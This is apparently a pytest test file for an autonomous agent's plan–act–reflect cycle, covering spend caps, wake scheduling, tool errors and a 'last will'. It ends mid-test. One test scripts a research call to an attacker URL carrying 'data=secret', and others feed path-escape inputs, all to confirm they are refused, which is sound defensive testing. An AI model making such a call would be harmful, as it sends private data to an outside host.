"""The wake cycle with scripted model replies: plan, act, reflect, the last will, and deciding when to wake."""

from __future__ import annotations

import itertools
import json
import os
from datetime import timedelta
from pathlib import Path
from typing import Any

import pytest

from app.agent import context, loop, prompts, store
from app.agent.sandbox import Jail, Limits
from app.agent.service import Agent
from app.config import LoadedSettings, Settings
from app.economy.costs import micros_to_usd
from app.economy.life import LifeStatus
from app.economy.metering import Completed, NotSent, usd_cap_to_micros
from app.economy.pricing import opening_cost, working_cycle_cost
from tests.economy_helpers import ScriptedTransport, make_economy

_ids = itertools.count(1)
# No venture cycles (0.10.0): these tests follow the ordinary cycle; tests/test_ventures.py has the venture ones.
ROOMY = Settings(starting_balance_usd=50, daily_spend_cap_usd=5, cycle_spend_cap_usd=1, venture_share=0)


def reply(content: list[dict[str, Any]], stop: str, output_tokens: int = 100) -> Completed:
    body = {
        "id": f"msg_{next(_ids)}",
        "type": "message",
        "role": "assistant",
        "model": "claude-sonnet-5",
        "content": content,
        "stop_reason": stop,
        "usage": {"input_tokens": 900, "output_tokens": output_tokens},
    }
    return Completed(body, f"req_{next(_ids)}")


def plan(steps: list[str] | None = None, focus: int | None = None, sleep: int = 120) -> Completed:
    data = {
        "assessment": "Fresh start.",
        "goal": "Try one idea",
        "focus_project_id": focus,
        "steps": ["look around", "start a project"] if steps is None else steps,
        "sleep_minutes": sleep,
    }
    return reply([{"type": "text", "text": json.dumps(data)}], "end_turn")


def tools(*calls: tuple[str, dict[str, Any]], stop: str = "tool_use") -> Completed:
    return reply([{"type": "tool_use", "id": f"toolu_{next(_ids)}", "name": n, "input": i} for n, i in calls], stop)


def text(words: str) -> Completed:
    return reply([{"type": "text", "text": words}], "end_turn")


def make_agent(data_dir: Path, outcomes: list[Any], settings: Settings = ROOMY) -> tuple[Agent, ScriptedTransport]:
    economy = make_economy(data_dir, settings)
    transport = ScriptedTransport(simulated=True, outcomes=outcomes)
    agent = Agent(economy.db, LoadedSettings(settings), economy, transport=transport, cycles_enabled=True)
    agent.recover()
    return agent, transport


def check_conversations(sent: list[dict[str, Any]]) -> None:
    """What the real API requires: alternating roles, and every tool_use answered first thing, in order."""
    for request in sent:
        messages = request["messages"]
        roles = [m["role"] for m in messages]
        assert roles[0] == "user" and all(a != b for a, b in itertools.pairwise(roles)), roles
        for before, after in itertools.pairwise(messages):
            if before["role"] != "assistant":
                continue
            uses = [b["id"] for b in before["content"] if b.get("type") == "tool_use"]
            if not uses:
                continue
            results = [b for b in after["content"] if b.get("type") == "tool_result"]
            assert [r["tool_use_id"] for r in results] == uses
            assert after["content"][: len(results)] == results


def rows(agent: Agent, sql: str) -> list[dict[str, Any]]:
    with agent.db.connection() as conn:
        return [dict(r) for r in conn.execute(sql)]


def test_a_full_cycle(data_dir: Path) -> None:
    project = {
        "title": "Niche guide",
        "hypothesis": "People pay 5 EUR for a guide",
        "next_step": "outline",
        "status": "active",
    }
    agent, transport = make_agent(
        data_dir,
        [
            plan(),
            tools(
                ("project_create", project),
                ("workspace_write", {"path": "guide/outline.md", "mode": "create", "content": "# Outline\n- one\n"}),
            ),
            text("Created the project and an outline."),
            tools(
                ("write_journal", {"summary": "Started a guide", "entry": "Outline written."}),
                ("set_sleep", {"minutes": 90, "reason": "nothing urgent"}),
            ),
        ],
    )
    end = agent.run_cycle("schedule")
    assert (end.status, end.sleep_minutes) == ("completed", 90)
    check_conversations(transport.sent)
    assert [r["purpose"] for r in rows(agent, "SELECT purpose FROM llm_calls ORDER BY id")] == [
        "plan",
        "work",
        "work",
        "reflect",
    ]
    assert rows(agent, "SELECT title, status FROM projects") == [{"title": "Niche guide", "status": "active"}]
    workspace, _ = agent.roots()
    assert workspace.read("guide/outline.md").startswith("# Outline")
    assert rows(agent, "SELECT author, summary FROM journal") == [{"author": "agent", "summary": "Started a guide"}]
    tools_used = rows(agent, "SELECT tool, status, phase FROM tool_calls ORDER BY id")
    assert [(t["tool"], t["status"], t["phase"]) for t in tools_used] == [
        ("project_create", "ok", "act"),
        ("workspace_write", "ok", "act"),
        ("write_journal", "ok", "reflect"),
        ("set_sleep", "ok", "reflect"),
    ]
    cycle = rows(agent, "SELECT status, sleep_minutes, plan FROM cycles")[0]
    assert cycle["status"] == "completed" and json.loads(cycle["plan"])["goal"] == "Try one idea"
    wake = agent._meta_time("next_wake_at")
    assert wake == agent.clock.now() + timedelta(minutes=90)
    view = agent.dashboard()
    assert view["now"]["status"] == "completed" and view["projects"][0]["title"] == "Niche guide"
    assert view["activity"][0]["calls"] == 4 and view["mind"]["journal"][0]["summary"] == "Started a guide"


def test_the_cycle_that_starts_a_project_counts_toward_it(data_dir: Path) -> None:
    project = {"title": "Niche guide", "hypothesis": "People pay 5 EUR", "next_step": "outline", "status": "active"}
    other = {**project, "title": "Second idea"}
    agent, transport = make_agent(
        data_dir,
        [
            plan(focus=None),
            tools(("project_create", project), ("project_create", other)),
            text("Started."),
            text("Reflected."),
            plan(steps=[], focus=2),
        ],
    )
    agent.run_cycle("schedule")
    cycle = rows(agent, "SELECT id, project_id FROM cycles")[0]
    assert cycle["project_id"] == 1  # the first project it started; the plan had no focus
    cost = rows(agent, "SELECT SUM(cost_micros) AS total FROM llm_calls")[0]["total"]
    assert cost > 0
    spent = {p["title"]: (p["spent_usd"], p["cycles"]) for p in agent.dashboard()["projects"]}
    assert spent == {"Niche guide": (micros_to_usd(cost), 1), "Second idea": (0, 0)}
    agent.run_cycle("schedule")  # the next plan sees what the project cost
    planner = transport.sent[-1]["messages"][0]["content"][0]["text"]
    assert f"#1 [active] Niche guide · next: outline · spent ${micros_to_usd(cost):.2f} · earned $0.00" in planner
    assert rows(agent, "SELECT project_id FROM cycles ORDER BY id") == [{"project_id": 1}, {"project_id": 2}]


def test_the_agent_sees_the_files_in_every_folder(data_dir: Path) -> None:
    agent, transport = make_agent(
        data_dir, [plan(), tools(("workspace_list", {})), text("Looked."), text("Reflected.")]
    )
    workspace, _ = agent.roots()
    workspace.write("projects/meal-plans.md", "# Meal plans\n")
    workspace.write("projects/drafts/week-1.md", "Monday: soup\n")
    workspace.write("ideas.md", "x" * 1_500)
    agent.run_cycle("schedule")
    lines = "== WORKSPACE ==\nideas.md (1,500 B)\nprojects/drafts/week-1.md (13 B)\nprojects/meal-plans.md (13 B)\n"
    planner, brief = (r["messages"][0]["content"][0]["text"] for r in transport.sent[:2])
    assert lines in planner and lines in brief
    listed = rows(agent, "SELECT result FROM tool_calls WHERE tool = 'workspace_list'")[0]["result"]
    assert listed == (
        "ideas.md  1,500 B\nprojects/drafts/week-1.md  13 B\nprojects/meal-plans.md  13 B\n"
        "Using 1.5 KB of 50 MB and 3 of 5,000 files (in 2 folders)"
    )
    for n in range(40):
        workspace.write(f"notes/n{n:02}.md", "x")
    shown = context._safe_listing(workspace)  # all 20 lines reach the brief, the count of the rest among them
    assert len(shown) == 20 and shown[18] == "notes/n17.md (1 B)" and shown[19] == "… and 24 more files"


def test_long_paths_leave_the_brief_its_count_of_files_and_its_limits(tmp_path: Path) -> None:
    """Long paths with a plan, focus and lessons at their limits: the brief still says how many files it left out."""
    workspace = Jail(tmp_path / "workspace")
    for n in range(25):
        workspace.write(f"projects/printable-meal-planning-templates/week-{n:02}-shopping-list.md", "x" * 2_000)
    lines = context._safe_listing(workspace)
    assert 5 < len(lines) < 20 and lines[-1] == f"… and {26 - len(lines)} more files"
    snap = context.Snapshot(
        status=LifeStatus(mode="dry_run", life_id=1, state="alive", reason=""),
        local_time="Monday 2026-09-28 10:00 CEST",
        version="0.4.0",
        agent_name="Ember",
        today_spend=0,
        daily_cap=5.0,
        cycle_cap=1.0,
        memory={"lessons": "\n".join(f"- [#c{n}] Check demand with one cheap listing first." for n in range(40))},
        workspace=lines,
    )
    focus = {"id": 1, "title": "t" * 80, "status": "active", "hypothesis": "h" * 400, "next_step": "n" * 200}
    big_plan = {"goal": "g" * 300, "steps": ["s" * 200] * 6}
    brief, _ = context.brief(snap, True, big_plan, focus | {"notes": "N" * 2_000}, 15)  # type: ignore[arg-type]
    assert brief.endswith(
        f"\n{lines[-2]}\n{lines[-1]}\n\n== LIMITS ==\n"
        "At most 15 steps this cycle and 4 tool calls per step. Stop when the goal is reached."
    )


@pytest.mark.parametrize("path", ["drafts\n/post.md", "post.md\n", "drafts/post.md\r", " post.md", "drafts /post.md"])
def test_a_path_with_a_line_break_or_space_is_refused_and_nothing_is_created(data_dir: Path, path: str) -> None:
    agent, transport = make_agent(
        data_dir,
        [
            plan(),
            tools(
                ("workspace_write", {"path": path, "mode": "create", "content": "hello"}),
                ("workspace_read", {"path": path}),
            ),
            text("Done."),
            text("Reflected."),
        ],
    )
    agent.run_cycle("schedule")
    results = transport.sent[2]["messages"][-1]["content"]
    assert all(r["is_error"] for r in results)
    assert all("control character" in r["content"] or "is not allowed" in r["content"] for r in results)
    workspace, _ = agent.roots()
    assert os.listdir(workspace.root) == []  # not even a folder


def test_an_empty_plan_is_an_idle_cycle(data_dir: Path) -> None:
    agent, transport = make_agent(data_dir, [plan(steps=[], sleep=600)])
    end = agent.run_cycle("schedule")
    assert (end.status, end.sleep_minutes) == ("idle", 600)
    assert len(transport.sent) == 1


@pytest.mark.parametrize(
    ("first", "status"),
    [
        (text("not json"), "failed"),
        (reply([{"type": "text", "text": "{"}], "max_tokens"), "failed"),
        (reply([{"type": "text", "text": "No."}], "refusal"), "stopped"),
        (NotSent("no route"), "failed"),
    ],
)
def test_a_bad_plan_ends_the_cycle(data_dir: Path, first: Any, status: str) -> None:
    agent, _ = make_agent(data_dir, [first])
    assert agent.run_cycle("schedule").status == status
    assert rows(agent, "SELECT author FROM journal") == [{"author": "system"}]


def test_tool_errors_and_limits_go_back_to_the_model(data_dir: Path) -> None:
    many = [("workspace_list", {}) for _ in range(5)]
    agent, transport = make_agent(
        data_dir,
        [
            plan(),
            tools(
                ("workspace_write", {"path": "../escape.md", "mode": "create", "content": "x"}),
                ("no_such_tool", {}),
                ("project_update", {"project_id": "seven"}),
            ),
            tools(*many),
            tools(("workspace_write", {"path": "cut.md", "mode": "create", "content": "partial"}), stop="max_tokens"),
            text("Done."),
            text("Reflection without tools."),
        ],
    )
    assert agent.run_cycle("schedule").status == "completed"
    check_conversations(transport.sent)
    second = transport.sent[2]["messages"][-1]["content"]
    assert all(r["is_error"] for r in second)
    assert "leaves the workspace" in second[0]["content"] or "not allowed" in second[0]["content"]
    assert "no tool called" in second[1]["content"] and "whole number" in second[2]["content"]
    fifth = transport.sent[3]["messages"][-1]["content"][4]
    assert fifth["is_error"] and "at most 4 tool calls" in fifth["content"]
    cut = transport.sent[4]["messages"][-1]["content"][0]
    assert cut["is_error"] and "cut off" in cut["content"]
    workspace, _ = agent.roots()
    assert not workspace.exists("cut.md")  # a possibly incomplete call never runs
    statuses = [r["status"] for r in rows(agent, "SELECT status FROM tool_calls ORDER BY id")]
    assert statuses.count("skipped") == 2
    # Without a journal call, the reflection's text becomes the entry.
    assert rows(agent, "SELECT author, summary FROM journal") == [
        {"author": "agent", "summary": "Reflection without tools."}
    ]


def test_the_step_limit_answers_pending_calls_in_the_reflection(data_dir: Path) -> None:
    settings = Settings(starting_balance_usd=50, daily_spend_cap_usd=5, cycle_spend_cap_usd=1, max_tool_steps=2)
    agent, transport = make_agent(
        data_dir,
        [
            plan(),
            tools(("workspace_list", {})),
            tools(("workspace_list", {})),
            tools(("write_journal", {"summary": "Two looks", "entry": "Listed twice."})),
        ],
        settings,
    )
    end = agent.run_cycle("schedule")
    assert end.status == "completed"
    check_conversations(transport.sent)
    assert transport.sent[2]["tool_choice"] == {"type": "none"}  # the last step can't call tools
    reflect = transport.sent[3]["messages"][-1]["content"]
    assert reflect[0]["type"] == "tool_result" and reflect[-1]["text"].startswith("REFLECT PHASE")
    assert "(you used all your tool steps)" in reflect[-1]["text"]
    cycle = rows(agent, "SELECT act_end_reason FROM cycles")[0]
    assert cycle["act_end_reason"] == "step limit reached"


def test_the_reflection_is_told_why_the_work_ended(data_dir: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    # In live use two reflections after a conversation that got too long tried to make files, and one of them wrote
    # no journal: they weren't told that the work was over, nor why.
    monkeypatch.setattr("app.agent.loop.MAX_CONVERSATION_BYTES", 100)  # one step fills it
    agent, transport = make_agent(
        data_dir,
        [
            plan(),
            tools(("workspace_list", {})),
            tools(("write_journal", {"summary": "Listed", "entry": "The conversation got too long."})),
        ],
    )
    end = agent.run_cycle("schedule")
    assert (end.status, end.note) == ("completed", "the conversation got too long")
    prompt = transport.sent[2]["messages"][-1]["content"][-1]["text"]
    assert prompt.startswith(
        "REFLECT PHASE. Your work steps for this cycle are over (the conversation reached its size limit)"
    )
    assert "making files, looking at pictures, research, brainstorms and proposals are refused now" in prompt
    # 0.10.1: the first venture cycle's reflection spent its one reply on other calls and wrote no journal; 0.11.1:
    # one was cut off at its length limit, so the journal comes first.
    assert "This is your last reply, and its length is limited: make every tool call in it (at most 4), write_journal"
    assert " first, with a short, candid entry" in prompt
    assert prompts.reflect_prompt("refused: the daily cap is used up").startswith(
        "REFLECT PHASE. Your work steps for this cycle are over (refused: the daily cap is used up)"
    )
    assert "(the plan is done)" in prompts.reflect_prompt() and "{ended}" not in prompts.reflect_prompt("x" * 500)


def test_tools_allowed_in_each_phase(data_dir: Path) -> None:
    agent, _ = make_agent(
        data_dir,
        [
            plan(),
            tools(("workspace_list", {})),
            text("ok"),
            tools(("workspace_list", {}), ("write_journal", {"summary": "Fine", "entry": "x"})),
        ],
    )
    agent.run_cycle("schedule")
    results = rows(agent, "SELECT tool, phase, status, result FROM tool_calls ORDER BY id")
    assert (results[0]["phase"], results[0]["status"]) == ("act", "ok")
    assert results[1]["status"] == "error" and "while reflecting" in results[1]["result"]
    assert (results[2]["phase"], results[2]["status"]) == ("reflect", "ok")


def test_a_journal_written_while_working_ends_the_cycle_without_a_reflection(data_dir: Path) -> None:
    # In live use the model wrote its journal at the end of its work in almost every cycle, and every such call
    # was refused and paid for. Now it counts, and the separate reflect call is skipped.
    agent, _ = make_agent(
        data_dir,
        [
            plan(),
            tools(
                ("write_journal", {"summary": "Drafted the post", "entry": "What worked..."}),
                ("set_sleep", {"minutes": 600, "reason": "Waiting for the owner"}),
            ),
            text("Done."),
        ],
    )
    end = agent.run_cycle("schedule")
    assert (end.status, end.sleep_minutes) == ("completed", 600)
    assert [r["purpose"] for r in rows(agent, "SELECT purpose FROM llm_calls ORDER BY id")] == ["plan", "work", "work"]
    assert rows(agent, "SELECT author, summary FROM journal") == [{"author": "agent", "summary": "Drafted the post"}]


def test_too_long_notes_are_cut_with_a_note_instead_of_refused(data_dir: Path) -> None:
    from app.agent import tools as agent_tools

    long_step = "Post the draft answer. " * 20  # 460 characters, over next_step's 200
    agent, _ = make_agent(
        data_dir,
        [
            plan(),
            tools(("project_create", {"title": "T", "hypothesis": "h", "next_step": long_step, "status": "idea"})),
            text("Done."),
            text("Reflected."),
        ],
    )
    agent.run_cycle("schedule")
    call = rows(agent, "SELECT status, result FROM tool_calls ORDER BY id")[0]
    assert call["status"] == "ok" and "next_step was cut to 200 of its 460 characters" in call["result"]
    stored = rows(agent, "SELECT next_step FROM projects")[0]["next_step"]
    assert len(stored) <= 200 and stored.endswith("draft…")
    create = next(d for d in agent_tools.definitions() if d["name"] == "project_create")
    assert create["input_schema"]["properties"]["next_step"]["maxLength"] == 200  # the model sees the limit


def test_the_models_own_cycle_tags_are_not_doubled(data_dir: Path) -> None:
    content = "[#c7] Keep next_step short.\n- [#c7][#c8] Ask less."
    agent, _ = make_agent(
        data_dir,
        [plan(), tools(("memory_update", {"file": "lessons", "mode": "append", "content": content})), text("Done.")],
    )
    agent.run_cycle("schedule")
    lessons = agent.memory().read("lessons")
    assert "- [#c1] Keep next_step short.\n- [#c1] Ask less.\n" in lessons and "[#c7]" not in lessons


def test_the_cycle_cap_ends_act_but_keeps_money_for_reflecting(data_dir: Path) -> None:
    # With the scripted transport a work step and the reflection are each quoted at 0.0225 USD, and the reflection
    # after a step 0.0325 (0.12.0: with room for the step's growth, 4,000 tokens); each call costs 0.0028. After the
    # plan and one step, 0.059 - 0.0056 leaves room for the reflection but not another step as well.
    settings = Settings(starting_balance_usd=50, daily_spend_cap_usd=5, cycle_spend_cap_usd=0.059)
    agent, transport = make_agent(
        data_dir,
        [plan(), tools(("workspace_list", {})), tools(("workspace_list", {})), text("reflected")],
        settings,
    )
    end = agent.run_cycle("schedule")
    assert end.status == "completed"
    purposes = [r["purpose"] for r in rows(agent, "SELECT purpose FROM llm_calls ORDER BY id")]
    assert purposes == ["plan", "work", "reflect"]
    assert "reflecting" in rows(agent, "SELECT act_end_reason FROM cycles")[0]["act_end_reason"]


def test_starvation_leads_to_the_last_will(data_dir: Path) -> None:
    # The planning call (0.014 USD) and the last-will reserve don't both fit in 0.03 USD.
    settings = Settings(starting_balance_usd=0.03, daily_spend_cap_usd=5, cycle_spend_cap_usd=1)
    will = "I tried a guide. Lesson: ask people first."
    agent, _ = make_agent(data_dir, [text(will)], settings)
    end = agent.run_cycle("schedule")
    assert end.status == "refused" and end.rerun
    status = agent.economy.life.evaluate()
    assert status.state == "critical" and status.last_will_due
    decision = agent.decide()
    assert (decision.run, decision.trigger) == (True, "last_will")
    assert agent.run_cycle("last_will").status == "completed"
    status = agent.economy.life.evaluate()
    assert status.last_will_at is not None and not status.last_will_due
    assert rows(agent, "SELECT text FROM last_wills") == [{"text": will}]


def test_deciding_when_to_wake(data_dir: Path) -> None:
    agent, _ = make_agent(data_dir, [plan(steps=[], sleep=60)])
    first = agent.decide()
    assert not first.run and first.wait_until is not None  # the first wake-up is two minutes after start
    agent.clock.advance(minutes=3)
    decision = agent.decide()
    assert (decision.run, decision.trigger) == (True, "schedule")
    agent.economy.set_paused(True)
    assert agent.decide().reason == "The agent is paused"
    assert agent.request_wake()[1]["code"] == "not_runnable"
    agent.economy.set_paused(False)
    assert agent.request_wake()[0] == 202
    assert agent.decide().trigger == "owner"
    assert agent.request_wake()[1]["code"] == "too_soon"
    agent.run_cycle("owner")
    assert not agent.wake_requested
    assert agent._meta_time("next_wake_at") == agent.clock.now() + timedelta(minutes=60)


def test_the_daily_cap_defers_the_next_wake_to_tomorrow(data_dir: Path) -> None:
    settings = Settings(starting_balance_usd=50, daily_spend_cap_usd=0.02, cycle_spend_cap_usd=0.02)
    agent, _ = make_agent(data_dir, [], settings)
    agent.decide()  # schedules the first wake-up
    agent.clock.advance(minutes=3)
    decision = agent.decide()
    assert not decision.run and "daily cap" in decision.reason
    assert decision.wait_until is not None and decision.wait_until > agent.clock.now() + timedelta(hours=1)


@pytest.mark.parametrize("short", [1, 0])
def test_a_wake_needs_room_for_a_work_step_and_the_reflection(
    data_dir: Path, monkeypatch: pytest.MonkeyPatch, short: int
) -> None:
    agent, _ = make_agent(data_dir, [])  # a daily cap of 5 USD
    opening, working = (cost(ROOMY, agent.db, "dry_run") or 0 for cost in (opening_cost, working_cycle_cost))
    # 0.10 USD pays for the plan alone; the default cycle cap (0.25 USD) pays for some work too.
    assert opening < 100_000 < working < usd_cap_to_micros(Settings().cycle_spend_cap_usd)
    left = working - short  # micro-USD left of today's cap
    monkeypatch.setattr(agent.economy.books, "cap_spend_on", lambda scope, day: 5_000_000 - left)
    agent.decide()  # schedules the first wake-up
    agent.clock.advance(minutes=3)
    decision = agent.decide()
    assert decision.run is (short == 0) and (decision.reason == "Waiting for the daily cap to reset") is (short == 1)


def test_a_daily_cap_below_a_working_cycle_gets_a_cycle_with_all_of_it(
    data_dir: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    settings = Settings(starting_balance_usd=50, daily_spend_cap_usd=0.1, cycle_spend_cap_usd=0.1)
    agent, _ = make_agent(data_dir, [], settings)
    assert (working_cycle_cost(settings, agent.db, "dry_run") or 0) > 100_000  # a real cycle may still cost less
    agent.decide()
    agent.clock.advance(minutes=3)
    assert agent.decide().run  # nothing spent today: all of the cap is there
    monkeypatch.setattr(agent.economy.books, "cap_spend_on", lambda scope, day: 1)
    decision = agent.decide()
    assert not decision.run and decision.reason == "Waiting for the daily cap to reset"
    assert decision.wait_until is not None and decision.wait_until > agent.clock.now() + timedelta(hours=1)


def test_a_cycle_cap_without_room_for_a_work_step_holds_the_scheduled_wakes(data_dir: Path) -> None:
    settings = Settings(starting_balance_usd=50, daily_spend_cap_usd=5, cycle_spend_cap_usd=0.04)
    agent, _ = make_agent(data_dir, [plan(), plan(steps=[], sleep=600)], settings)
    assert agent.run_cycle("schedule").note == loop.NO_STEP  # the plan was paid for, no step was affordable
    working = micros_to_usd(working_cycle_cost(settings, agent.db, "dry_run") or 0)
    reason = (
        "The last cycle had no money left for a work step after its plan: the cycle spend cap ($0.04) is below what"
        f" a working cycle can cost (up to ${working:.2f}). Raise it, or press Wake now"
    )
    fields = agent.agent_fields()
    assert (fields["next_wake_at"], fields["next_wake_reason"]) == (None, reason)
    agent.clock.advance(days=2)
    decision = agent.decide()
    assert (decision.run, decision.reason, decision.wait_until) == (False, reason, None)  # no more plans to pay for
    assert agent.request_wake()[0] == 202 and agent.decide().trigger == "owner"  # the owner can still try
    assert agent.run_cycle("owner").status == "idle"
    assert agent.agent_fields()["next_wake_reason"] == agent.decide().reason == "Ember chose 600 min"


def test_no_room_for_a_work_step_under_a_roomy_cycle_cap_backs_off_as_usual(
    data_dir: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    settings = Settings(starting_balance_usd=50, daily_spend_cap_usd=1, cycle_spend_cap_usd=0.5)
    agent, _ = make_agent(data_dir, [plan()], settings)
    monkeypatch.setattr(agent.economy.books, "cap_spend_on", lambda scope, day: 960_000)  # 0.04 USD left today
    assert agent.run_cycle("owner").note == loop.NO_STEP
    assert (
        agent.agent_fields()["next_wake_reason"] == "after a refused cycle, backing off"
    )  # the day's cap, not the cycle's


def test_a_cycle_that_can_not_afford_a_work_step_does_not_reflect(data_dir: Path) -> None:
    # With the scripted transport a work step and the reflection are each quoted at 0.0225 USD: after the plan
    # (0.0028), 0.04 has no room for both.
    settings = Settings(starting_balance_usd=50, daily_spend_cap_usd=5, cycle_spend_cap_usd=0.04)
    agent, transport = make_agent(data_dir, [plan(), text("unused")], settings)
    with agent.db.transaction() as conn:
        store.insert_message(conn, agent.scope(), None, "Are you there?", "2026-09-01T11:00:00Z")
    end = agent.run_cycle("schedule")
    assert (end.status, end.note) == ("refused", loop.NO_STEP)
    assert [r["purpose"] for r in rows(agent, "SELECT purpose FROM llm_calls")] == ["plan"]
    assert rows(agent, "SELECT author, summary FROM journal") == [
        {"author": "system", "summary": f"Cycle ended refused: {loop.NO_STEP}"}
    ]
    assert rows(agent, "SELECT act_end_reason FROM cycles") == [{"act_end_reason": loop.NO_STEP}]
    # The brief never reached the model: the owner's message is still news.
    assert rows(agent, "SELECT seen_cycle_id FROM messages") == [{"seen_cycle_id": None}]


def test_the_next_wake_says_how_long_the_agent_chose_to_sleep_and_why(data_dir: Path) -> None:
    agent, _ = make_agent(
        data_dir,
        [
            plan(sleep=120),
            tools(("set_sleep", {"minutes": 90, "reason": "Early guess."})),
            text("Done."),
            tools(
                ("write_journal", {"summary": "Looked", "entry": "."}),
                ("set_sleep", {"minutes": 480, "reason": 'Nothing "urgent".'}),
            ),
            plan(steps=[], sleep=600),
            NotSent("down"),
        ],
    )
    end = agent.run_cycle("schedule")
    assert (end.sleep_minutes, end.sleep_reason) == (480, 'Nothing "urgent".')  # the reflection's call wins
    assert agent.agent_fields()["next_wake_reason"] == 'Ember chose 480 min: "Nothing \\"urgent\\"."'
    assert agent._meta_time("next_wake_at") == agent.clock.now() + timedelta(minutes=480)
    agent.clock.advance(minutes=481)
    assert agent.run_cycle("schedule").status == "idle"  # the plan's sleep: chosen, without words
    assert agent.agent_fields()["next_wake_reason"] == "Ember chose 600 min"
    agent.clock.advance(minutes=601)
    assert agent.run_cycle("schedule").status == "failed"
    assert agent.agent_fields()["next_wake_reason"] == "after a failed cycle, backing off"


def test_failures_back_off_and_a_crash_loop_waits_for_the_owner(data_dir: Path) -> None:
    agent, _ = make_agent(data_dir, [NotSent("down"), NotSent("down")])
    agent.clock.advance(minutes=3)
    assert agent.run_cycle("schedule").status == "failed"
    first = agent._meta_time("next_wake_at")
    agent.clock.advance(minutes=31)
    assert agent.run_cycle("schedule").status == "failed"
    assert agent._meta_time("next_wake_at") - agent.clock.now() > first - (agent.clock.now() - timedelta(minutes=31))
    with agent.db.connection() as conn:
        life = conn.execute("SELECT id FROM lives").fetchone()[0]
        for _ in range(3):
            conn.execute(
                "INSERT INTO cycles (life_id, boot_id, started_at, ended_at, status, trigger, simulated, cap_micros,"
                " session) VALUES (?, 'b', '2026-09-01T12:00:00Z', '2026-09-01T12:01:00Z', 'interrupted', 't', 1, 0,"
                " ?)",
                (life, agent.economy.life.session()),
            )
    agent.clock.advance(days=1)
    assert "interrupted" in agent.decide().reason


def test_stopping_interrupts_the_cycle(data_dir: Path) -> None:
    agent, _ = make_agent(data_dir, [plan(), tools(("workspace_list", {}))])
    agent.stop.set()
    assert agent.run_cycle("schedule").status == "interrupted"


def test_records_are_kept_per_dry_run_session(data_dir: Path) -> None:
    project = {"title": "Old idea", "hypothesis": "h", "next_step": "n", "status": "idea"}
    agent, _ = make_agent(data_dir, [plan(), tools(("project_create", project)), text("done"), text("r")])
    agent.run_cycle("schedule")
    assert len(agent.dashboard()["projects"]) == 1
    from tests.economy_helpers import restart

    live = restart(agent.economy, Settings(dry_run=False, starting_balance_usd=50))
    live.clock.advance(minutes=1)
    fresh_economy = restart(live, ROOMY)
    fresh = Agent(
        fresh_economy.db, LoadedSettings(ROOMY), fresh_economy, transport=ScriptedTransport(), cycles_enabled=True
    )
    fresh.recover()
    assert fresh.dashboard()["projects"] == []
    workspace, _ = fresh.roots()
    assert workspace.listing() == []


def test_a_failure_that_cost_nothing_is_retried_once(data_dir: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from app.agent import loop

    monkeypatch.setattr(loop, "RETRY_DELAY_SECONDS", 0)
    agent, transport = make_agent(data_dir, [NotSent("blip"), plan(steps=[])])
    assert agent.run_cycle("schedule").status == "idle"
    assert [r["status"] for r in rows(agent, "SELECT status FROM llm_calls ORDER BY id")] == ["failed", "ok"]


def test_an_empty_reply_is_never_sent_back(data_dir: Path) -> None:
    agent, transport = make_agent(
        data_dir,
        [plan(), tools(("workspace_list", {})), reply([], "end_turn"), text("did a listing"), text("reflected")],
    )
    assert agent.run_cycle("schedule").status == "completed"
    check_conversations(transport.sent)
    assert all(m["content"] for request in transport.sent for m in request["messages"])
    nudge = transport.sent[3]["messages"][-1]["content"]
    assert nudge[0]["type"] == "tool_result" and nudge[-1]["text"].startswith("Continue with the plan")


def test_research_can_only_read_pages_it_found(data_dir: Path) -> None:
    found = reply(
        [
            {"type": "server_tool_use", "id": "srvtoolu_1", "name": "web_search", "input": {"query": "q"}},
            {
                "type": "web_search_tool_result",
                "tool_use_id": "srvtoolu_1",
                "content": [{"type": "web_search_result", "url": "https://example.invalid/a", "title": "A"}],
            },
            {"type": "text", "text": "A says something."},
        ],
        "end_turn",
    )
    agent, transport = make_agent(
        data_dir,
        [
            plan(),
            tools(("research", {"question": "q", "url": "https://attacker.invalid/?data=secret"})),
            tools(("research", {"question": "q"})),
            found,
            tools(("research", {"question": "q", "url": "https://example.invalid/a"})),
            text("fetched page"),
            text("done"),
            text("reflected"),
        ],
    )
    agent.run_cycle("schedule")
    results = rows(agent, "SELECT status, result FROM tool_calls WHERE tool = 'research' ORDER BY id")
    assert results[0]["status"] == "error" and "appeared in your research results" in results[0]["result"]
    assert results[1]["status"] == "ok" and "https://example.invalid/a" in results[1]["result"]
    assert results[2]["status"] == "ok"
    fetch = [r for r in transport.sent if r.get("tools") and r["tools"][0].get("type", "").startswith("web_fetch")]
    assert len(fetch) == 1 and "https://example.invalid/a" in fetch[0]["messages"][0]["content"][0]["text"]


def test_a_failing_last_will_is_given_up_after_three_tries(data_dir: Path) -> None:
    settings = Settings(starting_balance_usd=0.03, daily_spend_cap_usd=5, cycle_spend_cap_usd=1)
    agent, _ = make_agent(data_dir, [reply([], "end_turn")] * 3, settings)
    agent.run_cycle("schedule")  # starves: the will is due
    for _ in range(3):
        assert agent.decide().trigger == "last_will"
        assert agent.run_cycle("last_will").status == "failed"
        agent.clock.advance(days=1)
    assert agent.decide().trigger != "last_will"
    assert any("Gave up on the last will" in e["message"] for e in agent.db.recent_events(limit=20))


def test_every_plan_says_how_it_leads_to_money(data_dir: Path) -> None:
    from app.agent import prompts

    assert "money_path" in prompts.PLAN_SCHEMA["required"]
    data = {
        "assessment": "ok",
        "goal": "Test one listing",
        "money_path": "Parents pay 4 EUR per planner; 5 sales in two weeks means continue, none means stop.",
        "focus_project_id": None,
        "steps": ["draft the listing"],
        "sleep_minutes": 120,
    }
    agent, transport = make_agent(
        data_dir, [reply([{"type": "text", "text": json.dumps(data)}], "end_turn"), text("Drafted."), text("Done.")]
    )
    agent.run_cycle("schedule")
    brief = transport.sent[1]["messages"][0]["content"][0]["text"]
    assert f"Path to money: {data['money_path']}" in brief
    stored = json.loads(rows(agent, "SELECT plan FROM cycles")[0]["plan"])
    assert stored["money_path"] == data["money_path"]
    assert agent.dashboard()["now"]["plan_detail"]["money_path"] == data["money_path"]


def test_a_plan_without_a_money_path_still_runs(data_dir: Path) -> None:
    agent, transport = make_agent(data_dir, [plan(steps=["look around"]), text("Looked."), text("Done.")])
    assert agent.run_cycle("schedule").status == "completed"
    assert "Path to money" not in transport.sent[1]["messages"][0]["content"][0]["text"]


def test_a_cut_off_reply_runs_the_calls_it_finished(data_dir: Path) -> None:
    # 0.11.1: a reply cut off by max_tokens can only have lost the end of its last block; the calls before it are whole.
